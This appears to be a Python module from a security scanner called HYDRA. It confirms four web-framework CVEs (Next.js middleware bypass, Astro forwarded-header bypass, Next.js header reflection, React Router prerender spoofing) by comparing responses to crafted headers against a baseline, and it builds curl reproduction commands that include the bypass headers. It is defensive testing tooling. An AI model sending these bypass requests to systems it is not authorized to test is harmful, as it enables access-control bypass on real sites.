"""FrameworkChecks: existing checks without policy or payload changes."""

import logging
import uuid
from typing import List
from urllib.parse import urlparse
from hydra.hunt.safety import EvidenceLevel
from hydra.hunt.confirmation.models import ProbeExchange, ConfirmationResult


from hydra.hunt.confirmation.signatures import (
    _HDR_REFLECT_NAME,
    _NEXT_MW_HEADER,
    _NEXT_MW_VALUES,
    _RR_PRERENDER_HEADER,
    _RR_ROUTE_IDS,
    _RR_VALUE_RE,
)

logger = logging.getLogger("hydra.hunt.confirm")


class FrameworkChecks:
    async def _confirm_nextjs(self, target_url, prober) -> ConfirmationResult:
        """Benign CVE-2025-29927 proof: an access-control STATUS differential.

        Baseline GET (no header) must be access-gated — 401/403 or a redirect.
        We then resend WITH the benign ``x-middleware-subrequest`` header: if the
        same route now returns 200, middleware (auth/redirect) was skipped. This
        is a header-PRESENCE differential only — HYDRA never reads or exfiltrates
        the protected content, it only records that the gate opened.
        """
        exchanges: List[ProbeExchange] = []

        base = await prober.get(target_url)
        exchanges.append(
            ProbeExchange(
                "control", base.url, base.status, "no bypass header (baseline)"
            )
        )
        if not base.ok:
            return ConfirmationResult(
                target=target_url,
                param="",
                vuln_class="nextjs",
                confirmed=False,
                evidence_level=EvidenceLevel.UNVERIFIED,
                exchanges=exchanges,
                summary="Baseline request failed; cannot assess the differential.",
                note=base.error or "no response",
            )

        baseline_gated = base.status in (401, 403) or (
            300 <= base.status < 400 and bool(base.location)
        )
        if not baseline_gated:
            return ConfirmationResult(
                target=target_url,
                param="",
                vuln_class="nextjs",
                confirmed=False,
                evidence_level=EvidenceLevel.OBSERVED,
                exchanges=exchanges,
                technique="CVE-2025-29927 middleware bypass",
                summary=(
                    f"Baseline is not access-gated (HTTP {base.status}); the "
                    "middleware-bypass differential does not apply. Point "
                    "this at a route that is 401/403/redirected when "
                    "unauthenticated."
                ),
            )
        for value in _NEXT_MW_VALUES:
            p = await prober.get(target_url, headers={_NEXT_MW_HEADER: value})
            exchanges.append(
                ProbeExchange("payload", p.url, p.status, f"{_NEXT_MW_HEADER}: {value}")
            )
            if not p.ok:
                continue
            # The differential: gated without the header, 200 with it.
            if not (p.status == 200 and base.status != 200):
                continue
            repeats_ok = 0
            for _ in range(self.repeats):
                r = await prober.get(target_url, headers={_NEXT_MW_HEADER: value})
                ok = r.ok and r.status == 200
                exchanges.append(
                    ProbeExchange(
                        "repeat",
                        r.url,
                        r.status,
                        "bypass reproduced" if ok else "gate held on repeat",
                    )
                )
                if ok:
                    repeats_ok += 1
            reproduced = repeats_ok >= 1
            level = EvidenceLevel.REPRODUCED if reproduced else EvidenceLevel.INFERRED
            return ConfirmationResult(
                target=target_url,
                param="",
                vuln_class="nextjs",
                confirmed=True,
                evidence_level=level,
                technique="CVE-2025-29927 middleware bypass",
                exchanges=exchanges,
                poc=self._nextjs_poc(target_url, value, base.status),
                summary=(
                    f"Next.js middleware bypass (CVE-2025-29927): route was "
                    f"HTTP {base.status} without the header and HTTP 200 with "
                    f"'{_NEXT_MW_HEADER}: {value}'"
                    + (
                        f", reproduced on {repeats_ok + 1} requests."
                        if reproduced
                        else " (single observation; repeat did not re-trigger)."
                    )
                ),
                note=(
                    "Access-control differential only: the protected route's "
                    "gate opened. HYDRA did NOT read or exfiltrate protected "
                    "content — confirm impact manually within your "
                    "authorization."
                ),
            )
        return ConfirmationResult(
            target=target_url,
            param="",
            vuln_class="nextjs",
            confirmed=False,
            evidence_level=EvidenceLevel.OBSERVED,
            exchanges=exchanges,
            technique="CVE-2025-29927 middleware bypass",
            summary=(
                "Route is access-gated and no tested benign "
                f"'{_NEXT_MW_HEADER}' value flipped it to HTTP 200 — no "
                "middleware bypass observed (not vulnerable, or patched)."
            ),
        )

    async def _confirm_astro(self, target_url, prober, nonce="") -> ConfirmationResult:
        """Benign CVE-2025-64525 proof: an X-Forwarded-* access-control differential.

        Baseline GET (no forwarded headers) must be access-gated — 401/403 or a
        redirect. We then resend spoofing the forwarded origin — ONLY to an empty
        value or the target's OWN hostname, never a foreign host (so a shared
        cache can never be poisoned for another user). If the same route now
        returns HTTP 200, Astro's middleware trusted the spoofed origin and its
        host/proto gate was bypassed. Status-only: HYDRA never reads the protected
        content, it only records that the gate opened.
        """
        exchanges: List[ProbeExchange] = []
        own_host = (
            urlparse(
                target_url
                if "//" in (target_url or "")
                else "https://" + (target_url or "")
            ).hostname
            or ""
        )
        tech = "CVE-2025-64525 Astro forwarded-origin bypass"

        base = await prober.get(target_url)
        exchanges.append(
            ProbeExchange(
                "control", base.url, base.status, "no forwarded headers (baseline)"
            )
        )
        if not base.ok:
            return ConfirmationResult(
                target=target_url,
                param="",
                vuln_class="astro",
                confirmed=False,
                evidence_level=EvidenceLevel.UNVERIFIED,
                exchanges=exchanges,
                technique=tech,
                summary="Baseline request failed; cannot assess the differential.",
                note=base.error or "no response",
            )

        baseline_gated = base.status in (401, 403) or (
            300 <= base.status < 400 and bool(base.location)
        )
        if not baseline_gated:
            return ConfirmationResult(
                target=target_url,
                param="",
                vuln_class="astro",
                confirmed=False,
                evidence_level=EvidenceLevel.OBSERVED,
                exchanges=exchanges,
                technique=tech,
                summary=(
                    f"Baseline is not access-gated (HTTP {base.status}); the "
                    "forwarded-origin bypass differential does not apply. "
                    "Point this at a route that is 401/403/redirected when "
                    "the host/proto gate is not satisfied."
                ),
            )
        # ASTRO_CONFIRM_PLACEHOLDER
        # Benign spoof sets — EMPTY host, or the target's OWN host/proto/port
        # only. Never a foreign host (no shared-cache poisoning). Each value is a
        # plain benign token that passes the header-safety + denylist gate.
        spoof_sets = [
            {"x-forwarded-host": ""},
            {"x-forwarded-proto": "http"},
            {"x-forwarded-port": "80"},
        ]
        if own_host:
            spoof_sets.append(
                {"x-forwarded-host": own_host, "x-forwarded-proto": "http"}
            )
        for headers in spoof_sets:
            label = ", ".join(f"{k}: {v!r}" for k, v in headers.items())
            p = await prober.get(target_url, headers=headers)
            exchanges.append(ProbeExchange("payload", p.url, p.status, label))
            if not (p.ok and p.status == 200 and base.status != 200):
                continue
            repeats_ok = 0
            for _ in range(self.repeats):
                r = await prober.get(target_url, headers=headers)
                ok = r.ok and r.status == 200
                exchanges.append(
                    ProbeExchange(
                        "repeat",
                        r.url,
                        r.status,
                        "bypass reproduced" if ok else "gate held on repeat",
                    )
                )
                if ok:
                    repeats_ok += 1
            reproduced = repeats_ok >= 1
            level = EvidenceLevel.REPRODUCED if reproduced else EvidenceLevel.INFERRED
            return ConfirmationResult(
                target=target_url,
                param="",
                vuln_class="astro",
                confirmed=True,
                evidence_level=level,
                technique=tech,
                exchanges=exchanges,
                poc=self._astro_poc(target_url, headers, base.status),
                summary=(
                    f"Astro forwarded-origin bypass (CVE-2025-64525): route "
                    f"was HTTP {base.status} without forwarded headers and "
                    f"HTTP 200 with [{label}]"
                    + (
                        f", reproduced on {repeats_ok + 1} requests."
                        if reproduced
                        else " (single observation; repeat did not re-trigger)."
                    )
                ),
                note=(
                    "Access-control differential only — the host/proto gate "
                    "opened. HYDRA spoofed the forwarded origin ONLY to an empty "
                    "value / the target's own host (never a foreign host, so no "
                    "shared-cache poisoning) and did NOT read the protected "
                    "content. Confirm impact manually within your authorization."
                ),
            )
        return ConfirmationResult(
            target=target_url,
            param="",
            vuln_class="astro",
            confirmed=False,
            evidence_level=EvidenceLevel.OBSERVED,
            exchanges=exchanges,
            technique=tech,
            summary=(
                "Route is access-gated and no benign forwarded-origin spoof "
                "flipped it to HTTP 200 — no bypass observed (not vulnerable, "
                "or the middleware does not trust X-Forwarded-*)."
            ),
        )

    async def _confirm_header_reflection(
        self, target_url, prober, nonce=""
    ) -> ConfirmationResult:
        """Benign CVE-2025-57822 proof: a request-header REFLECTION differential.

        We send one unique, benign marker request header and check ONLY whether
        that exact marker is echoed back — in the body or a response header — that
        a header-less control did NOT contain. A reflected marker means the app
        copies attacker request headers into its response/outbound path (the SSRF
        precondition in Next.js ``NextResponse.next({request:{headers}})``).
        Reflection is a LEAD, not execution: the actual SSRF proof stays the
        operator-owned OOB callback (``--confirm-class ssrf --oob-callback``), so
        this stays at INFERRED, confirmed=False, and never fetches an internal or
        metadata host to 'prove' it.
        """
        nonce = nonce or uuid.uuid4().hex[:12]
        marker = f"hydraprobe{nonce}"  # alnum only → passes every safety gate
        tech = "CVE-2025-57822 request-header reflection (SSRF precondition)"
        exchanges: List[ProbeExchange] = []
        # HDR_REFLECT_PLACEHOLDER
        base = await prober.get(target_url)
        exchanges.append(
            ProbeExchange(
                "control", base.url, base.status, "no marker header (baseline)"
            )
        )
        if not base.ok:
            return ConfirmationResult(
                target=target_url,
                param="",
                vuln_class="nextjs_ssrf",
                confirmed=False,
                evidence_level=EvidenceLevel.UNVERIFIED,
                exchanges=exchanges,
                technique=tech,
                summary="Baseline request failed; cannot assess reflection.",
                note=base.error or "no response",
            )

        # The marker must be UNIQUE: if it somehow already appears in the control
        # response, any later 'reflection' is coincidental — bail honestly.
        if marker in (base.body or "") or self._in_headers(base.headers, marker):
            return ConfirmationResult(
                target=target_url,
                param="",
                vuln_class="nextjs_ssrf",
                confirmed=False,
                evidence_level=EvidenceLevel.UNVERIFIED,
                exchanges=exchanges,
                technique=tech,
                summary="Marker collided with baseline content; inconclusive.",
            )

        p = await prober.get(target_url, headers={_HDR_REFLECT_NAME: marker})
        exchanges.append(
            ProbeExchange("payload", p.url, p.status, f"{_HDR_REFLECT_NAME}: {marker}")
        )
        if not p.ok:
            return ConfirmationResult(
                target=target_url,
                param="",
                vuln_class="nextjs_ssrf",
                confirmed=False,
                evidence_level=EvidenceLevel.UNVERIFIED,
                exchanges=exchanges,
                technique=tech,
                summary="Marker request failed.",
                note=p.error or "no response",
            )

        where = (
            "response body"
            if marker in (p.body or "")
            else "a response header"
            if self._in_headers(p.headers, marker)
            else ""
        )
        if not where:
            return ConfirmationResult(
                target=target_url,
                param="",
                vuln_class="nextjs_ssrf",
                confirmed=False,
                evidence_level=EvidenceLevel.OBSERVED,
                exchanges=exchanges,
                technique=tech,
                summary=(
                    "Benign marker header was not reflected — no "
                    "header-reflection SSRF precondition observed here."
                ),
            )

        # Reflected. Deliberate repeat to show it holds — but this stays a LEAD:
        # reflection != SSRF execution, so confirmed=False and we point to the OOB
        # path for the actual proof.
        for _ in range(self.repeats):
            r = await prober.get(target_url, headers={_HDR_REFLECT_NAME: marker})
            ok = r.ok and (
                marker in (r.body or "") or self._in_headers(r.headers, marker)
            )
            exchanges.append(
                ProbeExchange(
                    "repeat",
                    r.url,
                    r.status,
                    "reflection reproduced" if ok else "not reflected on repeat",
                )
            )
        return ConfirmationResult(
            target=target_url,
            param="",
            vuln_class="nextjs_ssrf",
            confirmed=False,
            evidence_level=EvidenceLevel.INFERRED,
            technique=tech,
            exchanges=exchanges,
            poc=self._reflect_poc(target_url, marker),
            summary=(
                f"Request header '{_HDR_REFLECT_NAME}' reflected into "
                f"{where} (marker={marker}) — the header-reflection "
                "precondition for CVE-2025-57822 SSRF is present."
            ),
            note=(
                "LEAD only: reflection proves the app copies attacker request "
                "headers into its response/outbound path, NOT that it can be "
                "driven to fetch an internal URL. Prove the SSRF itself with an "
                "operator-owned out-of-band callback: --confirm-class ssrf "
                "--oob-callback <your-host>. HYDRA never fetches internal / "
                "metadata hosts to 'prove' it."
            ),
        )

    async def _confirm_react_router(
        self, target_url, prober, nonce=""
    ) -> ConfirmationResult:
        """Benign CVE-2025-43865 proof: a prerender-data SPOOFING differential.

        React Router v7 / Remix (vulnerable versions) trust a client-supplied
        ``X-React-Router-Prerender-Data`` request header and serialise its per-
        route ``data`` into the server-rendered HTML. We inject a UNIQUE, pure-
        alnum, operator-owned marker as that route data; if the marker lands in
        the HTML of the header-carrying request but NOT in a header-less control,
        the server reflects client-controlled prerender data — the spoofing
        precondition is present.

        The marker is pure ``[A-Za-z0-9]`` so it carries NO HTML metacharacter:
        this proves ONLY the spoofing CHANNEL. Executable XSS and cross-user
        cache poisoning are the real impacts and stay UNdemonstrated here — hence
        confirmed=True for the spoofing reflection, but severity only medium.
        """
        nonce = nonce or uuid.uuid4().hex[:12]
        marker = f"hydrardspoof{nonce}"  # pure alnum → passes every safety gate
        route_id = _RR_ROUTE_IDS[0]
        tech = "CVE-2025-43865 React Router/Remix prerender-data spoofing"
        exchanges: List[ProbeExchange] = []

        # Fail CLOSED if our own marker is not in the allowlisted alnum shape — we
        # never ship a prerender value that could carry an HTML metacharacter.
        if not _RR_VALUE_RE.match(marker):
            return ConfirmationResult(
                target=target_url,
                param="",
                vuln_class="react_router",
                confirmed=False,
                evidence_level=EvidenceLevel.UNVERIFIED,
                technique=tech,
                summary="Internal marker failed the alnum allowlist; aborted.",
            )

        # JSON wrapper the loader deserialises. The marker is validated pure-alnum
        # above, so the only non-alnum chars are JSON structure ({ } " :) — none a
        # marker — and the whole value stays benign.
        value = '{"%s":{"data":"%s"}}' % (route_id, marker)

        base = await prober.get(target_url)
        exchanges.append(
            ProbeExchange(
                "control", base.url, base.status, "no prerender-data header (baseline)"
            )
        )
        if not base.ok:
            return ConfirmationResult(
                target=target_url,
                param="",
                vuln_class="react_router",
                confirmed=False,
                evidence_level=EvidenceLevel.UNVERIFIED,
                exchanges=exchanges,
                technique=tech,
                summary="Baseline request failed; cannot assess spoofing.",
                note=base.error or "no response",
            )

        # The marker must be UNIQUE: if it already appears in the header-less
        # control, any later 'reflection' is coincidental — bail honestly.
        if marker in (base.body or "") or self._in_headers(base.headers, marker):
            return ConfirmationResult(
                target=target_url,
                param="",
                vuln_class="react_router",
                confirmed=False,
                evidence_level=EvidenceLevel.UNVERIFIED,
                exchanges=exchanges,
                technique=tech,
                summary="Marker collided with baseline content; inconclusive.",
            )

        p = await prober.get(target_url, headers={_RR_PRERENDER_HEADER: value})
        exchanges.append(
            ProbeExchange(
                "payload", p.url, p.status, f"{_RR_PRERENDER_HEADER}: {value}"
            )
        )
        if not p.ok:
            return ConfirmationResult(
                target=target_url,
                param="",
                vuln_class="react_router",
                confirmed=False,
                evidence_level=EvidenceLevel.UNVERIFIED,
                exchanges=exchanges,
                technique=tech,
                summary="Prerender-data request failed.",
                note=p.error or "no response",
            )

        reflected = marker in (p.body or "") or self._in_headers(p.headers, marker)
        if not reflected:
            return ConfirmationResult(
                target=target_url,
                param="",
                vuln_class="react_router",
                confirmed=False,
                evidence_level=EvidenceLevel.OBSERVED,
                exchanges=exchanges,
                technique=tech,
                summary=(
                    "Client-supplied prerender data was NOT reflected into "
                    "the HTML — no React Router prerender-data spoofing "
                    "observed here."
                ),
            )

        # Reflected on first send. Repeat to show it holds — a controlled
        # differential + a deliberate repeat is the doctrine's REPRODUCED. This is
        # a GENUINE spoofing proof (client input lands in the server HTML), so
        # confirmed=True; but the marker is non-executable, so XSS / poisoning
        # impact stays UNdemonstrated and severity stays medium.
        held = True
        for _ in range(self.repeats):
            r = await prober.get(target_url, headers={_RR_PRERENDER_HEADER: value})
            ok = r.ok and (
                marker in (r.body or "") or self._in_headers(r.headers, marker)
            )
            held = held and ok
            exchanges.append(
                ProbeExchange(
                    "repeat",
                    r.url,
                    r.status,
                    "spoof reproduced" if ok else "not reflected on repeat",
                )
            )

        level = EvidenceLevel.REPRODUCED if held else EvidenceLevel.OBSERVED
        return ConfirmationResult(
            target=target_url,
            param="",
            vuln_class="react_router",
            confirmed=True,
            evidence_level=level,
            technique=tech,
            exchanges=exchanges,
            poc=self._react_router_poc(target_url, value, marker),
            summary=(
                f"Client-controlled '{_RR_PRERENDER_HEADER}' data "
                f"(marker={marker}) was reflected into the server-rendered "
                "HTML — the CVE-2025-43865 prerender-data spoofing "
                "precondition is present."
            ),
            note=(
                "Spoofing CHANNEL only: a benign pure-alnum marker proves the "
                "server serialises client-supplied prerender data into its "
                "HTML. HYDRA does NOT escalate this to executable XSS or "
                "cross-user cache poisoning — those impacts stay UNdemonstrated. "
                "Confirm them manually within your authorization."
            ),
        )

    @staticmethod
    def _nextjs_poc(target_url, header_value, baseline_status) -> str:
        return "\n".join(
            [
                "# Safe reproduction — CVE-2025-29927 Next.js middleware bypass",
                "# (benign: a request-header presence differential; no data read)",
                f"# baseline (no header) — expect gated (HTTP {baseline_status}):",
                f"curl -si '{target_url}'",
                "# with bypass header — expect HTTP 200 (middleware skipped):",
                f"curl -si -H '{_NEXT_MW_HEADER}: {header_value}' '{target_url}'",
            ]
        )

    @staticmethod
    def _in_headers(headers, marker) -> bool:
        """True if ``marker`` appears in any response header value."""
        return any(marker in str(v) for v in (headers or {}).values())

    @staticmethod
    def _astro_poc(target_url, headers, baseline_status) -> str:
        hdr_args = " ".join(f"-H '{k}: {v}'" for k, v in headers.items())
        return "\n".join(
            [
                "# Safe reproduction — CVE-2025-64525 Astro forwarded-origin bypass",
                "# (benign: a request-header STATUS differential; no data read)",
                f"# baseline (no forwarded headers) — expect gated (HTTP {baseline_status}):",
                f"curl -si '{target_url}'",
                "# with spoofed forwarded origin (own host / empty ONLY) — expect HTTP 200:",
                f"curl -si {hdr_args} '{target_url}'",
                "# NOTE: HYDRA only ever spoofs to an empty value or the target's OWN",
                "#   host — never a foreign host a shared cache could replay.",
            ]
        )

    @staticmethod
    def _reflect_poc(target_url, marker) -> str:
        return "\n".join(
            [
                "# Safe reproduction — CVE-2025-57822 Next.js request-header reflection",
                "# (benign: a unique marker header echoed back; NOT the SSRF itself)",
                "# baseline (no marker) — marker should be ABSENT:",
                f"curl -si '{target_url}'",
                f"# with benign marker header — expect '{marker}' echoed in body/headers:",
                f"curl -si -H '{_HDR_REFLECT_NAME}: {marker}' '{target_url}'",
                "# NOTE: reflection is the SSRF PRECONDITION. Prove SSRF out-of-band",
                "#   with a host YOU own: --confirm-class ssrf --oob-callback <host>.",
            ]
        )

    @staticmethod
    def _react_router_poc(target_url, header_value, marker) -> str:
        return "\n".join(
            [
                "# Safe reproduction — CVE-2025-43865 React Router/Remix prerender-data spoofing",
                "# (benign: a unique pure-alnum marker reflected into HTML; NOT XSS)",
                "# baseline (no header) — marker should be ABSENT:",
                f"curl -si '{target_url}'",
                f"# with client-supplied prerender data — expect '{marker}' in the HTML:",
                f"curl -si -H '{_RR_PRERENDER_HEADER}: {header_value}' '{target_url}'",
                "# NOTE: the marker is pure [A-Za-z0-9] — it carries no HTML metachar, so",
                "#   this proves ONLY the spoofing channel. HYDRA never escalates it to",
                "#   executable XSS or cross-user cache poisoning; confirm impact in scope.",
            ]
        )
